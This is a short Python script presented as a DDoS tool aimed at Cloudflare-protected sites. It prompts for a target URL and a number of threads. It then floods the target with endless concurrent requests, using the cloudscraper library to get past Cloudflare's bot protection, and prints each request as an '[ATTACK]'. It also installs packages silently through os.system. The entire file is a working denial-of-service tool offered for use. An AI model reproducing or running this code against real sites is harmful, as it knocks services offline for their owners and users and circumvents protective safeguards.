import cloudscraper
import requests
import threading
from time import sleep
import os
print(" ")
print(" ")
os.system(" pip3 install cloudscraper ")
print(" ")
os.system(" pip3 install requests ")
print(" ")
print(" ")

# check the target url
def check_url(url):
    try:
        cloudfare_check_url = requests.Session()
        response = cloudfare_check_url.get(url)
        if response.status_code == 200:
            print("[INFO] The Url İs Valid")
        elif response.status_code == 404:
            print("[INFO] The Url İs İnvalid")
    except:
        bypass = cloudscraper.create_scraper()
        response2 = bypass.get(url)
        if response2.status_code == 200:
            print("[INFO] The Url İs Valid")
        elif response2.status_code == 404:
            print("[INFO] The Url İs İnvalid")

count = 0

# ddos cloudfare
def bypass(url, threads):

    r = requests.Session()
    bypass2 = cloudscraper.create_scraper()

    def do_req():
        global count
        while True:
            response = r.get(url)
            count +=1

            print("\n" + f"[ATTACK] Status Code : {response.status_code} Request Number: {count}" + "\n")

            response = bypass2.get(url)
            print("\n" + f"[ATTACK] Status Code : {response.status_code} Request Number: {count}" + "\n")

    list_of_threads = []

    for i in range(int(threads)):
        t = threading.Thread(target=do_req)
        t.daemon = True
        # appending all the threads to the list of threads
        list_of_threads.append(t)

    for i in range(int(threads)):
        #starting the threads
        list_of_threads[i].start()

    for i in range(int(threads)):
        #joining the threads
        list_of_threads[i].join()

print(
    """
   ________                __________                ____  ____       _____
  / ____/ /___  __  ______/ / ____/ /___ _________  / __ \/ __ \____ / ___/
 / /   / / __ \/ / / / __  / /_  / / __ `/ ___/ _ \/ / / / / / / __ \\__ \ 
/ /___/ / /_/ / /_/ / /_/ / __/ / / /_/ / /  /  __/ /_/ / /_/ / /_/ /__/ / 
\____/_/\____/\__,_/\__,_/_/   /_/\__,_/_/   \___/_____/_____/\____/____/  
                                                                           
    """
)

url = input("[INFO] Enter The Target Url : ")
check_url(url)
sleep(1)

threads = input("[INFO] Enter The Number Of Threads : ")
bypass(url, threads)
